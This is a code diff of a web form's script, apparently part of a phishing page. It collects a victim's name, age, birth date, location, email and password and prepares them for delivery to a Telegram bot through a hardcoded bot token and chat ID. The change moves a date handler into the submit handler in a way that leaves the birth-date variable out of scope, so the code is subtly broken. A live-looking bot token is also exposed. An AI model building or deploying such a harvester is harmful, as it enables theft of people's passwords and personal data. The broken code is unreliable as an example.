@@ -48,15 +48,7 @@
     <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
     
     <script>
-      var inputDate = document.getElementById("tgl_lahir");
-
-inputDate.addEventListener("change", function() {
-  var selectedDate = inputDate.value;
-  var dateObject = new Date(selectedDate);
-  var options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
-  const tanggal_lahir = dateObject.toLocaleDateString('id-ID', options);
-
-});
+   
 
  const botToken = '5906990752:AAHv8iFSmHu4MC4SM_IB3EZSiyTLxaZULvM';
 const chatId = '-1001983705713'; // Chat ID penerima pesan
@@ -81,11 +73,20 @@ form.addEventListener('submit', async (event) => {
   const alamat = document.getElementById('lokasi').value;
   const email = document.getElementById('email').value;
   const kata_sandi = document.getElementById('kata_sandi').value;
+     var inputDate = document.getElementById("tgl_lahir");
+
+inputDate.addEventListener("change", function() {
+  var selectedDate = inputDate.value;
+  var dateObject = new Date(selectedDate);
+  var options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+  const tgl_lahir = dateObject.toLocaleDateString('id-ID', options);
+
+});
   // Buat string dari data yang diambil
   const message = `
   Nama : ${nama}
   Umur : ${umur} Tahun
-  Tanggal Lahir : ${tanggal_lahir}
+  Tanggal Lahir : ${tgl_lahir}
   Lokasi : ${alamat}
   Email : ${email}
   Kata Sandi : ${kata_sandi}
